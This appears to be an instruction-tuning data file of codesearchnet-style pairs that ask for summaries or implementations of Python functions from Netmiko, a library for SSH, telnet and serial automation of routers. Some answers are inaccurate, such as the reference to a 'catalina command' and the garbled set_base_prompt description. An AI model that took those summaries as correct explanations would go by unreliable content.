{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _read_channel_timing(self, delay_factor=1, max_loops=150):\n        # Time to delay in each read loop\n        loop_delay = 0.1\n        final_delay = 2\n\n        # Default to making loop time be roughly equivalent to self.timeout (support old max_loops\n        # and delay_factor arguments for backwards compatibility).\n        delay_factor = self.select_delay_factor(delay_factor)\n        if delay_factor == 1 and max_loops == 150:\n            max_loops = int(self.timeout / loop_delay)\n\n        channel_data = \"\"\n        i = 0\n        while i <= max_loops:\n            time.sleep(loop_delay * delay_factor)\n            new_data = self.read_channel()\n            if new_data:\n                channel_data += new_data\n            else:\n                # Safeguard to make sure really done\n                time.sleep(final_delay * delay_factor)\n                new_data = self.read_channel()\n                if not new_data:\n                    break\n                else:\n                    channel_data += new_data\n            i += 1\n        return channel_data", "response": "Read data on the channel based on timing delays."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef read_until_prompt_or_pattern(self, pattern=\"\", re_flags=0):\n        combined_pattern = re.escape(self.base_prompt)\n        if pattern:\n            combined_pattern = r\"({}|{})\".format(combined_pattern, pattern)\n        return self._read_channel_expect(combined_pattern, re_flags=re_flags)", "response": "Read until either self. base_prompt or pattern is detected."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef telnet_login(\n        self,\n        pri_prompt_terminator=r\"#\\s*$\",\n        alt_prompt_terminator=r\">\\s*$\",\n        username_pattern=r\"(?:user:|username|login|user name)\",\n        pwd_pattern=r\"assword\",\n        delay_factor=1,\n        max_loops=20,\n    ):\n        \"\"\"Telnet login. Can be username/password or just password.\n\n        :param pri_prompt_terminator: Primary trailing delimiter for identifying a device prompt\n        :type pri_prompt_terminator: str\n\n        :param alt_prompt_terminator: Alternate trailing delimiter for identifying a device prompt\n        :type alt_prompt_terminator: str\n\n        :param username_pattern: Pattern used to identify the username prompt\n        :type username_pattern: str\n\n        :param delay_factor: See __init__: global_delay_factor\n        :type delay_factor: int\n\n        :param max_loops: Controls the wait time in conjunction with the delay_factor\n        (default: 20)\n        \"\"\"\n        delay_factor = self.select_delay_factor(delay_factor)\n        time.sleep(1 * delay_factor)\n\n        output = \"\"\n        return_msg = \"\"\n        i = 1\n        while i <= max_loops:\n            try:\n                output = self.read_channel()\n                return_msg += output\n\n                # Search for username pattern / send username\n                if re.search(username_pattern, output, flags=re.I):\n                    self.write_channel(self.username + self.TELNET_RETURN)\n                    time.sleep(1 * delay_factor)\n                    output = self.read_channel()\n                    return_msg += output\n\n                # Search for password pattern / send password\n                if re.search(pwd_pattern, output, flags=re.I):\n                    self.write_channel(self.password + self.TELNET_RETURN)\n                    time.sleep(0.5 * delay_factor)\n                    output = self.read_channel()\n                    return_msg += output\n                    if re.search(\n                        pri_prompt_terminator, output, flags=re.M\n                    ) or re.search(alt_prompt_terminator, output, flags=re.M):\n                        return return_msg\n\n                # Check if proper data received\n                if re.search(pri_prompt_terminator, output, flags=re.M) or re.search(\n                    alt_prompt_terminator, output, flags=re.M\n                ):\n                    return return_msg\n\n                self.write_channel(self.TELNET_RETURN)\n                time.sleep(0.5 * delay_factor)\n                i += 1\n            except EOFError:\n                self.remote_conn.close()\n                msg = \"Login failed: {}\".format(self.host)\n                raise NetMikoAuthenticationException(msg)\n\n        # Last try to see if we already logged in\n        self.write_channel(self.TELNET_RETURN)\n        time.sleep(0.5 * delay_factor)\n        output = self.read_channel()\n        return_msg += output\n        if re.search(pri_prompt_terminator, output, flags=re.M) or re.search(\n            alt_prompt_terminator, output, flags=re.M\n        ):\n            return return_msg\n\n        msg = \"Login failed: {}\".format(self.host)\n        self.remote_conn.close()\n        raise NetMikoAuthenticationException(msg)", "response": "Telnet login. Can be username/password or just password.\n\n        :param pri_prompt_terminator: Primary trailing delimiter for identifying a device prompt\n        :type pri_prompt_terminator: str\n\n        :param alt_prompt_terminator: Alternate trailing delimiter for identifying a device prompt\n        :type alt_prompt_terminator: str\n\n        :param username_pattern: Pattern used to identify the username prompt\n        :type username_pattern: str\n\n        :param delay_factor: See __init__: global_delay_factor\n        :type delay_factor: int\n\n        :param max_loops: Controls the wait time in conjunction with the delay_factor\n        (default: 20)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _use_ssh_config(self, dict_arg):\n        connect_dict = dict_arg.copy()\n\n        # Use SSHConfig to generate source content.\n        full_path = path.abspath(path.expanduser(self.ssh_config_file))\n        if path.exists(full_path):\n            ssh_config_instance = paramiko.SSHConfig()\n            with io.open(full_path, \"rt\", encoding=\"utf-8\") as f:\n                ssh_config_instance.parse(f)\n                source = ssh_config_instance.lookup(self.host)\n        else:\n            source = {}\n\n        if \"proxycommand\" in source:\n            proxy = paramiko.ProxyCommand(source[\"proxycommand\"])\n        elif \"ProxyCommand\" in source:\n            proxy = paramiko.ProxyCommand(source[\"ProxyCommand\"])\n        else:\n            proxy = None\n\n        # Only update 'hostname', 'sock', 'port', and 'username'\n        # For 'port' and 'username' only update if using object defaults\n        if connect_dict[\"port\"] == 22:\n            connect_dict[\"port\"] = int(source.get(\"port\", self.port))\n        if connect_dict[\"username\"] == \"\":\n            connect_dict[\"username\"] = source.get(\"user\", self.username)\n        if proxy:\n            connect_dict[\"sock\"] = proxy\n        connect_dict[\"hostname\"] = source.get(\"hostname\", self.host)\n\n        return connect_dict", "response": "Update SSH connection parameters based on contents of SSH config file."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _connect_params_dict(self):\n        conn_dict = {\n            \"hostname\": self.host,\n            \"port\": self.port,\n            \"username\": self.username,\n            \"password\": self.password,\n            \"look_for_keys\": self.use_keys,\n            \"allow_agent\": self.allow_agent,\n            \"key_filename\": self.key_file,\n            \"pkey\": self.pkey,\n            \"passphrase\": self.passphrase,\n            \"timeout\": self.timeout,\n            \"auth_timeout\": self.auth_timeout,\n        }\n\n        # Check if using SSH 'config' file mainly for SSH proxy support\n        if self.ssh_config_file:\n            conn_dict = self._use_ssh_config(conn_dict)\n        return conn_dict", "response": "Generate dictionary of Paramiko connection parameters."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nstripping out command echo trailing router prompt and ANSI escape codes.", "response": "def _sanitize_output(\n        self, output, strip_command=False, command_string=None, strip_prompt=False\n    ):\n        \"\"\"Strip out command echo, trailing router prompt and ANSI escape codes.\n\n        :param output: Output from a remote network device\n        :type output: unicode string\n\n        :param strip_command:\n        :type strip_command:\n        \"\"\"\n        if self.ansi_escape_codes:\n            output = self.strip_ansi_escape_codes(output)\n        output = self.normalize_linefeeds(output)\n        if strip_command and command_string:\n            command_string = self.normalize_linefeeds(command_string)\n            output = self.strip_command(command_string, output)\n        if strip_prompt:\n            output = self.strip_prompt(output)\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nestablish SSH connection to the network device.", "response": "def establish_connection(self, width=None, height=None):\n        \"\"\"Establish SSH connection to the network device\n\n        Timeout will generate a NetMikoTimeoutException\n        Authentication failure will generate a NetMikoAuthenticationException\n\n        width and height are needed for Fortinet paging setting.\n\n        :param width: Specified width of the VT100 terminal window\n        :type width: int\n\n        :param height: Specified height of the VT100 terminal window\n        :type height: int\n        \"\"\"\n        if self.protocol == \"telnet\":\n            self.remote_conn = telnetlib.Telnet(\n                self.host, port=self.port, timeout=self.timeout\n            )\n            self.telnet_login()\n        elif self.protocol == \"serial\":\n            self.remote_conn = serial.Serial(**self.serial_settings)\n            self.serial_login()\n        elif self.protocol == \"ssh\":\n            ssh_connect_params = self._connect_params_dict()\n            self.remote_conn_pre = self._build_ssh_client()\n\n            # initiate SSH connection\n            try:\n                self.remote_conn_pre.connect(**ssh_connect_params)\n            except socket.error:\n                self.paramiko_cleanup()\n                msg = \"Connection to device timed-out: {device_type} {ip}:{port}\".format(\n                    device_type=self.device_type, ip=self.host, port=self.port\n                )\n                raise NetMikoTimeoutException(msg)\n            except paramiko.ssh_exception.AuthenticationException as auth_err:\n                self.paramiko_cleanup()\n                msg = \"Authentication failure: unable to connect {device_type} {ip}:{port}\".format(\n                    device_type=self.device_type, ip=self.host, port=self.port\n                )\n                msg += self.RETURN + text_type(auth_err)\n                raise NetMikoAuthenticationException(msg)\n\n            if self.verbose:\n                print(\n                    \"SSH connection established to {}:{}\".format(self.host, self.port)\n                )\n\n            # Use invoke_shell to establish an 'interactive session'\n            if width and height:\n                self.remote_conn = self.remote_conn_pre.invoke_shell(\n                    term=\"vt100\", width=width, height=height\n                )\n            else:\n                self.remote_conn = self.remote_conn_pre.invoke_shell()\n\n            self.remote_conn.settimeout(self.blocking_timeout)\n            if self.keepalive:\n                self.remote_conn.transport.set_keepalive(self.keepalive)\n            self.special_login_handler()\n            if self.verbose:\n                print(\"Interactive SSH session established\")\n        return \"\""}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\npreparing for Paramiko SSH connection.", "response": "def _build_ssh_client(self):\n        \"\"\"Prepare for Paramiko SSH connection.\"\"\"\n        # Create instance of SSHClient object\n        remote_conn_pre = paramiko.SSHClient()\n\n        # Load host_keys for better SSH security\n        if self.system_host_keys:\n            remote_conn_pre.load_system_host_keys()\n        if self.alt_host_keys and path.isfile(self.alt_key_file):\n            remote_conn_pre.load_host_keys(self.alt_key_file)\n\n        # Default is to automatically add untrusted hosts (make sure appropriate for your env)\n        remote_conn_pre.set_missing_host_key_policy(self.key_policy)\n        return remote_conn_pre"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nchoose the greater of delay_factor or self.global_delay_factor (default). In fast_cli choose the lesser of delay_factor of self.global_delay_factor. :param delay_factor: See __init__: global_delay_factor :type delay_factor: int", "response": "def select_delay_factor(self, delay_factor):\n        \"\"\"\n        Choose the greater of delay_factor or self.global_delay_factor (default).\n        In fast_cli choose the lesser of delay_factor of self.global_delay_factor.\n\n        :param delay_factor: See __init__: global_delay_factor\n        :type delay_factor: int\n        \"\"\"\n        if self.fast_cli:\n            if delay_factor <= self.global_delay_factor:\n                return delay_factor\n            else:\n                return self.global_delay_factor\n        else:\n            if delay_factor >= self.global_delay_factor:\n                return delay_factor\n            else:\n                return self.global_delay_factor"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef set_base_prompt(\n        self, pri_prompt_terminator=\"#\", alt_prompt_terminator=\">\", delay_factor=1\n    ):\n        \"\"\"Sets self.base_prompt\n\n        Used as delimiter for stripping of trailing prompt in output.\n\n        Should be set to something that is general and applies in multiple contexts. For Cisco\n        devices this will be set to router hostname (i.e. prompt without '>' or '#').\n\n        This will be set on entering user exec or privileged exec on Cisco, but not when\n        entering/exiting config mode.\n\n        :param pri_prompt_terminator: Primary trailing delimiter for identifying a device prompt\n        :type pri_prompt_terminator: str\n\n        :param alt_prompt_terminator: Alternate trailing delimiter for identifying a device prompt\n        :type alt_prompt_terminator: str\n\n        :param delay_factor: See __init__: global_delay_factor\n        :type delay_factor: int\n        \"\"\"\n        prompt = self.find_prompt(delay_factor=delay_factor)\n        if not prompt[-1] in (pri_prompt_terminator, alt_prompt_terminator):\n            raise ValueError(\"Router prompt not found: {0}\".format(repr(prompt)))\n        # Strip off trailing terminator\n        self.base_prompt = prompt[:-1]\n        return self.base_prompt", "response": "Sets self. base_prompt to the router hostname for the given Cisco base entry."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef find_prompt(self, delay_factor=1):\n        delay_factor = self.select_delay_factor(delay_factor)\n        self.clear_buffer()\n        self.write_channel(self.RETURN)\n        time.sleep(delay_factor * 0.1)\n\n        # Initial attempt to get prompt\n        prompt = self.read_channel()\n        if self.ansi_escape_codes:\n            prompt = self.strip_ansi_escape_codes(prompt)\n\n        # Check if the only thing you received was a newline\n        count = 0\n        prompt = prompt.strip()\n        while count <= 10 and not prompt:\n            prompt = self.read_channel().strip()\n            if prompt:\n                if self.ansi_escape_codes:\n                    prompt = self.strip_ansi_escape_codes(prompt).strip()\n            else:\n                self.write_channel(self.RETURN)\n                time.sleep(delay_factor * 0.1)\n            count += 1\n\n        # If multiple lines in the output take the last line\n        prompt = self.normalize_linefeeds(prompt)\n        prompt = prompt.split(self.RESPONSE_RETURN)[-1]\n        prompt = prompt.strip()\n        if not prompt:\n            raise ValueError(\"Unable to find prompt: {}\".format(prompt))\n        time.sleep(delay_factor * 0.1)\n        self.clear_buffer()\n        return prompt", "response": "Finds the current network device prompt."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsends a command to the remote device using a delay - based mechanism.", "response": "def send_command_timing(\n        self,\n        command_string,\n        delay_factor=1,\n        max_loops=150,\n        strip_prompt=True,\n        strip_command=True,\n        normalize=True,\n        use_textfsm=False,\n    ):\n        \"\"\"Execute command_string on the SSH channel using a delay-based mechanism. Generally\n        used for show commands.\n\n        :param command_string: The command to be executed on the remote device.\n        :type command_string: str\n\n        :param delay_factor: Multiplying factor used to adjust delays (default: 1).\n        :type delay_factor: int or float\n\n        :param max_loops: Controls wait time in conjunction with delay_factor. Will default to be\n            based upon self.timeout.\n        :type max_loops: int\n\n        :param strip_prompt: Remove the trailing router prompt from the output (default: True).\n        :type strip_prompt: bool\n\n        :param strip_command: Remove the echo of the command from the output (default: True).\n        :type strip_command: bool\n\n        :param normalize: Ensure the proper enter is sent at end of command (default: True).\n        :type normalize: bool\n\n        :param use_textfsm: Process command output through TextFSM template (default: False).\n        :type normalize: bool\n        \"\"\"\n        output = \"\"\n        delay_factor = self.select_delay_factor(delay_factor)\n        self.clear_buffer()\n        if normalize:\n            command_string = self.normalize_cmd(command_string)\n\n        self.write_channel(command_string)\n        output = self._read_channel_timing(\n            delay_factor=delay_factor, max_loops=max_loops\n        )\n        output = self._sanitize_output(\n            output,\n            strip_command=strip_command,\n            command_string=command_string,\n            strip_prompt=strip_prompt,\n        )\n        if use_textfsm:\n            output = get_structured_data(\n                output, platform=self.device_type, command=command_string.strip()\n            )\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nstrips the trailing router prompt from the output.", "response": "def strip_prompt(self, a_string):\n        \"\"\"Strip the trailing router prompt from the output.\n\n        :param a_string: Returned string from device\n        :type a_string: str\n        \"\"\"\n        response_list = a_string.split(self.RESPONSE_RETURN)\n        last_line = response_list[-1]\n        if self.base_prompt in last_line:\n            return self.RESPONSE_RETURN.join(response_list[:-1])\n        else:\n            return a_string"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _first_line_handler(self, data, search_pattern):\n        try:\n            # First line is the echo line containing the command. In certain situations\n            # it gets repainted and needs filtered\n            lines = data.split(self.RETURN)\n            first_line = lines[0]\n            if BACKSPACE_CHAR in first_line:\n                pattern = search_pattern + r\".*$\"\n                first_line = re.sub(pattern, repl=\"\", string=first_line)\n                lines[0] = first_line\n                data = self.RETURN.join(lines)\n            return (data, True)\n        except IndexError:\n            return (data, False)", "response": "This function handles the first line of the catalina command."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef send_command(\n        self,\n        command_string,\n        expect_string=None,\n        delay_factor=1,\n        max_loops=500,\n        auto_find_prompt=True,\n        strip_prompt=True,\n        strip_command=True,\n        normalize=True,\n        use_textfsm=False,\n    ):\n        \"\"\"Execute command_string on the SSH channel using a pattern-based mechanism. Generally\n        used for show commands. By default this method will keep waiting to receive data until the\n        network device prompt is detected. The current network device prompt will be determined\n        automatically.\n\n        :param command_string: The command to be executed on the remote device.\n        :type command_string: str\n\n        :param expect_string: Regular expression pattern to use for determining end of output.\n            If left blank will default to being based on router prompt.\n        :type expect_string: str\n\n        :param delay_factor: Multiplying factor used to adjust delays (default: 1).\n        :type delay_factor: int\n\n        :param max_loops: Controls wait time in conjunction with delay_factor. Will default to be\n            based upon self.timeout.\n        :type max_loops: int\n\n        :param strip_prompt: Remove the trailing router prompt from the output (default: True).\n        :type strip_prompt: bool\n\n        :param strip_command: Remove the echo of the command from the output (default: True).\n        :type strip_command: bool\n\n        :param normalize: Ensure the proper enter is sent at end of command (default: True).\n        :type normalize: bool\n\n        :param use_textfsm: Process command output through TextFSM template (default: False).\n        :type normalize: bool\n        \"\"\"\n        # Time to delay in each read loop\n        loop_delay = 0.2\n\n        # Default to making loop time be roughly equivalent to self.timeout (support old max_loops\n        # and delay_factor arguments for backwards compatibility).\n        delay_factor = self.select_delay_factor(delay_factor)\n        if delay_factor == 1 and max_loops == 500:\n            # Default arguments are being used; use self.timeout instead\n            max_loops = int(self.timeout / loop_delay)\n\n        # Find the current router prompt\n        if expect_string is None:\n            if auto_find_prompt:\n                try:\n                    prompt = self.find_prompt(delay_factor=delay_factor)\n                except ValueError:\n                    prompt = self.base_prompt\n            else:\n                prompt = self.base_prompt\n            search_pattern = re.escape(prompt.strip())\n        else:\n            search_pattern = expect_string\n\n        if normalize:\n            command_string = self.normalize_cmd(command_string)\n\n        time.sleep(delay_factor * loop_delay)\n        self.clear_buffer()\n        self.write_channel(command_string)\n\n        i = 1\n        output = \"\"\n        past_three_reads = deque(maxlen=3)\n        first_line_processed = False\n\n        # Keep reading data until search_pattern is found or until max_loops is reached.\n        while i <= max_loops:\n            new_data = self.read_channel()\n            if new_data:\n                if self.ansi_escape_codes:\n                    new_data = self.strip_ansi_escape_codes(new_data)\n\n                output += new_data\n                past_three_reads.append(new_data)\n\n                # Case where we haven't processed the first_line yet (there is a potential issue\n                # in the first line (in cases where the line is repainted).\n                if not first_line_processed:\n                    output, first_line_processed = self._first_line_handler(\n                        output, search_pattern\n                    )\n                    # Check if we have already found our pattern\n                    if re.search(search_pattern, output):\n                        break\n\n                else:\n                    # Check if pattern is in the past three reads\n                    if re.search(search_pattern, \"\".join(past_three_reads)):\n                        break\n\n            time.sleep(delay_factor * loop_delay)\n            i += 1\n        else:  # nobreak\n            raise IOError(\n                \"Search pattern never detected in send_command_expect: {}\".format(\n                    search_pattern\n                )\n            )\n\n        output = self._sanitize_output(\n            output,\n            strip_command=strip_command,\n            command_string=command_string,\n            strip_prompt=strip_prompt,\n        )\n        if use_textfsm:\n            output = get_structured_data(\n                output, platform=self.device_type, command=command_string.strip()\n            )\n        return output", "response": "Send a command string to the remote device."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nstripping command_string from output string Cisco IOS adds backspaces into output for long commands (i.e. for commands that line wrap) :param command_string: The command string sent to the device :type command_string: str :param output: The returned output as a result of the command string sent to the device :type output: str", "response": "def strip_command(self, command_string, output):\n        \"\"\"\n        Strip command_string from output string\n\n        Cisco IOS adds backspaces into output for long commands (i.e. for commands that line wrap)\n\n        :param command_string: The command string sent to the device\n        :type command_string: str\n\n        :param output: The returned output as a result of the command string sent to the device\n        :type output: str\n        \"\"\"\n        backspace_char = \"\\x08\"\n\n        # Check for line wrap (remove backspaces)\n        if backspace_char in output:\n            output = output.replace(backspace_char, \"\")\n            output_lines = output.split(self.RESPONSE_RETURN)\n            new_output = output_lines[1:]\n            return self.RESPONSE_RETURN.join(new_output)\n        else:\n            command_length = len(command_string)\n            return output[command_length:]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef normalize_linefeeds(self, a_string):\n        newline = re.compile(\"(\\r\\r\\r\\n|\\r\\r\\n|\\r\\n|\\n\\r)\")\n        a_string = newline.sub(self.RESPONSE_RETURN, a_string)\n        if self.RESPONSE_RETURN == \"\\n\":\n            # Convert any remaining \\r to \\n\n            return re.sub(\"\\r\", self.RESPONSE_RETURN, a_string)", "response": "Convert any line feeds that are not allowed by the device to \\ n."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef normalize_cmd(self, command):\n        command = command.rstrip()\n        command += self.RETURN\n        return command", "response": "Normalize CLI commands to have a single trailing newline."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nchecking if the device is in enable mode. Return boolean.", "response": "def check_enable_mode(self, check_string=\"\"):\n        \"\"\"Check if in enable mode. Return boolean.\n\n        :param check_string: Identification of privilege mode from device\n        :type check_string: str\n        \"\"\"\n        self.write_channel(self.RETURN)\n        output = self.read_until_prompt()\n        return check_string in output"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef enable(self, cmd=\"\", pattern=\"ssword\", re_flags=re.IGNORECASE):\n        output = \"\"\n        msg = (\n            \"Failed to enter enable mode. Please ensure you pass \"\n            \"the 'secret' argument to ConnectHandler.\"\n        )\n        if not self.check_enable_mode():\n            self.write_channel(self.normalize_cmd(cmd))\n            try:\n                output += self.read_until_prompt_or_pattern(\n                    pattern=pattern, re_flags=re_flags\n                )\n                self.write_channel(self.normalize_cmd(self.secret))\n                output += self.read_until_prompt()\n            except NetMikoTimeoutException:\n                raise ValueError(msg)\n            if not self.check_enable_mode():\n                raise ValueError(msg)\n        return output", "response": "Enter enable mode.\n\n        :param cmd: Device command to enter enable mode\n        :type cmd: str\n\n        :param pattern: pattern to search for indicating device is waiting for password\n        :type pattern: str\n\n        :param re_flags: Regular expression flags used in conjunction with pattern\n        :type re_flags: int"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nexit enable mode. :param exit_command: Command that exits the session from privileged mode :type exit_command: str", "response": "def exit_enable_mode(self, exit_command=\"\"):\n        \"\"\"Exit enable mode.\n\n        :param exit_command: Command that exits the session from privileged mode\n        :type exit_command: str\n        \"\"\"\n        output = \"\"\n        if self.check_enable_mode():\n            self.write_channel(self.normalize_cmd(exit_command))\n            output += self.read_until_prompt()\n            if self.check_enable_mode():\n                raise ValueError(\"Failed to exit enable mode.\")\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nchecks if the device is in configuration mode or not.", "response": "def check_config_mode(self, check_string=\"\", pattern=\"\"):\n        \"\"\"Checks if the device is in configuration mode or not.\n\n        :param check_string: Identification of configuration mode from the device\n        :type check_string: str\n\n        :param pattern: Pattern to terminate reading of channel\n        :type pattern: str\n        \"\"\"\n        self.write_channel(self.RETURN)\n        # You can encounter an issue here (on router name changes) prefer delay-based solution\n        if not pattern:\n            output = self._read_channel_timing()\n        else:\n            output = self.read_until_pattern(pattern=pattern)\n        return check_string in output"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef config_mode(self, config_command=\"\", pattern=\"\"):\n        output = \"\"\n        if not self.check_config_mode():\n            self.write_channel(self.normalize_cmd(config_command))\n            output = self.read_until_pattern(pattern=pattern)\n            if not self.check_config_mode():\n                raise ValueError(\"Failed to enter configuration mode.\")\n        return output", "response": "Enter into config_mode.\n\n        :param config_command: Configuration command to send to the device\n        :type config_command: str\n\n        :param pattern: Pattern to terminate reading of channel\n        :type pattern: str"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nexit from configuration mode.", "response": "def exit_config_mode(self, exit_config=\"\", pattern=\"\"):\n        \"\"\"Exit from configuration mode.\n\n        :param exit_config: Command to exit configuration mode\n        :type exit_config: str\n\n        :param pattern: Pattern to terminate reading of channel\n        :type pattern: str\n        \"\"\"\n        output = \"\"\n        if self.check_config_mode():\n            self.write_channel(self.normalize_cmd(exit_config))\n            output = self.read_until_pattern(pattern=pattern)\n            if self.check_config_mode():\n                raise ValueError(\"Failed to exit configuration mode\")\n        log.debug(\"exit_config_mode: {}\".format(output))\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef send_config_from_file(self, config_file=None, **kwargs):\n        with io.open(config_file, \"rt\", encoding=\"utf-8\") as cfg_file:\n            return self.send_config_set(cfg_file, **kwargs)", "response": "Send configuration commands down the SSH channel from a file."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nsend configuration commands down the SSH channel.", "response": "def send_config_set(\n        self,\n        config_commands=None,\n        exit_config_mode=True,\n        delay_factor=1,\n        max_loops=150,\n        strip_prompt=False,\n        strip_command=False,\n        config_mode_command=None,\n    ):\n        \"\"\"\n        Send configuration commands down the SSH channel.\n\n        config_commands is an iterable containing all of the configuration commands.\n        The commands will be executed one after the other.\n\n        Automatically exits/enters configuration mode.\n\n        :param config_commands: Multiple configuration commands to be sent to the device\n        :type config_commands: list or string\n\n        :param exit_config_mode: Determines whether or not to exit config mode after complete\n        :type exit_config_mode: bool\n\n        :param delay_factor: Factor to adjust delays\n        :type delay_factor: int\n\n        :param max_loops: Controls wait time in conjunction with delay_factor (default: 150)\n        :type max_loops: int\n\n        :param strip_prompt: Determines whether or not to strip the prompt\n        :type strip_prompt: bool\n\n        :param strip_command: Determines whether or not to strip the command\n        :type strip_command: bool\n\n        :param config_mode_command: The command to enter into config mode\n        :type config_mode_command: str\n        \"\"\"\n        delay_factor = self.select_delay_factor(delay_factor)\n        if config_commands is None:\n            return \"\"\n        elif isinstance(config_commands, string_types):\n            config_commands = (config_commands,)\n\n        if not hasattr(config_commands, \"__iter__\"):\n            raise ValueError(\"Invalid argument passed into send_config_set\")\n\n        # Send config commands\n        cfg_mode_args = (config_mode_command,) if config_mode_command else tuple()\n        output = self.config_mode(*cfg_mode_args)\n        for cmd in config_commands:\n            self.write_channel(self.normalize_cmd(cmd))\n            if self.fast_cli:\n                pass\n            else:\n                time.sleep(delay_factor * 0.05)\n\n        # Gather output\n        output += self._read_channel_timing(\n            delay_factor=delay_factor, max_loops=max_loops\n        )\n        if exit_config_mode:\n            output += self.exit_config_mode()\n        output = self._sanitize_output(output)\n        log.debug(\"{}\".format(output))\n        return output"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nremoving any ANSI (VT100) ESC codes from the output http://en.wikipedia.org/wiki/ANSI_escape_code Note: this does not capture ALL possible ANSI Escape Codes only the ones I have encountered Current codes that are filtered: ESC = '\\x1b' or chr(27) ESC = is the escape character [^ in hex ('\\x1b') ESC[24;27H Position cursor ESC[?25h Show the cursor ESC[E Next line (HP does ESC-E) ESC[K Erase line from cursor to the end of line ESC[2K Erase entire line ESC[1;24r Enable scrolling from start to row end ESC[?6l Reset mode screen with options 640 x 200 monochrome (graphics) ESC[?7l Disable line wrapping ESC[2J Code erase display ESC[00;32m Color Green (30 to 37 are different colors) more general pattern is ESC[\\d\\d;\\d\\dm and ESC[\\d\\d;\\d\\d;\\d\\dm ESC[6n Get cursor position HP ProCurve and Cisco SG300 require this (possible others). :param string_buffer: The string to be processed to remove ANSI escape codes :type string_buffer: str", "response": "def strip_ansi_escape_codes(self, string_buffer):\n        \"\"\"\n        Remove any ANSI (VT100) ESC codes from the output\n\n        http://en.wikipedia.org/wiki/ANSI_escape_code\n\n        Note: this does not capture ALL possible ANSI Escape Codes only the ones\n        I have encountered\n\n        Current codes that are filtered:\n        ESC = '\\x1b' or chr(27)\n        ESC = is the escape character [^ in hex ('\\x1b')\n        ESC[24;27H   Position cursor\n        ESC[?25h     Show the cursor\n        ESC[E        Next line (HP does ESC-E)\n        ESC[K        Erase line from cursor to the end of line\n        ESC[2K       Erase entire line\n        ESC[1;24r    Enable scrolling from start to row end\n        ESC[?6l      Reset mode screen with options 640 x 200 monochrome (graphics)\n        ESC[?7l      Disable line wrapping\n        ESC[2J       Code erase display\n        ESC[00;32m   Color Green (30 to 37 are different colors) more general pattern is\n                     ESC[\\d\\d;\\d\\dm and ESC[\\d\\d;\\d\\d;\\d\\dm\n        ESC[6n       Get cursor position\n\n        HP ProCurve and Cisco SG300 require this (possible others).\n\n        :param string_buffer: The string to be processed to remove ANSI escape codes\n        :type string_buffer: str\n        \"\"\"  # noqa\n        log.debug(\"In strip_ansi_escape_codes\")\n        log.debug(\"repr = {}\".format(repr(string_buffer)))\n\n        code_position_cursor = chr(27) + r\"\\[\\d+;\\d+H\"\n        code_show_cursor = chr(27) + r\"\\[\\?25h\"\n        code_next_line = chr(27) + r\"E\"\n        code_erase_line_end = chr(27) + r\"\\[K\"\n        code_erase_line = chr(27) + r\"\\[2K\"\n        code_erase_start_line = chr(27) + r\"\\[K\"\n        code_enable_scroll = chr(27) + r\"\\[\\d+;\\d+r\"\n        code_form_feed = chr(27) + r\"\\[1L\"\n        code_carriage_return = chr(27) + r\"\\[1M\"\n        code_disable_line_wrapping = chr(27) + r\"\\[\\?7l\"\n        code_reset_mode_screen_options = chr(27) + r\"\\[\\?\\d+l\"\n        code_reset_graphics_mode = chr(27) + r\"\\[00m\"\n        code_erase_display = chr(27) + r\"\\[2J\"\n        code_graphics_mode = chr(27) + r\"\\[\\d\\d;\\d\\dm\"\n        code_graphics_mode2 = chr(27) + r\"\\[\\d\\d;\\d\\d;\\d\\dm\"\n        code_get_cursor_position = chr(27) + r\"\\[6n\"\n        code_cursor_position = chr(27) + r\"\\[m\"\n        code_erase_display = chr(27) + r\"\\[J\"\n        code_attrs_off = chr(27) + r\"[0m\"\n        code_reverse = chr(27) + r\"[7m\"\n\n        code_set = [\n            code_position_cursor,\n            code_show_cursor,\n            code_erase_line,\n            code_enable_scroll,\n            code_erase_start_line,\n            code_form_feed,\n            code_carriage_return,\n            code_disable_line_wrapping,\n            code_erase_line_end,\n            code_reset_mode_screen_options,\n            code_reset_graphics_mode,\n            code_erase_display,\n            code_graphics_mode,\n            code_graphics_mode2,\n            code_get_cursor_position,\n            code_cursor_position,\n            code_erase_display,\n            code_attrs_off,\n            code_reverse,\n        ]\n\n        output = string_buffer\n        for ansi_esc_code in code_set:\n            output = re.sub(ansi_esc_code, \"\", output)\n\n        # CODE_NEXT_LINE must substitute with return\n        output = re.sub(code_next_line, self.RETURN, output)\n\n        log.debug(\"new_output = {0}\".format(output))\n        log.debug(\"repr = {0}\".format(repr(output)))\n\n        return output"}
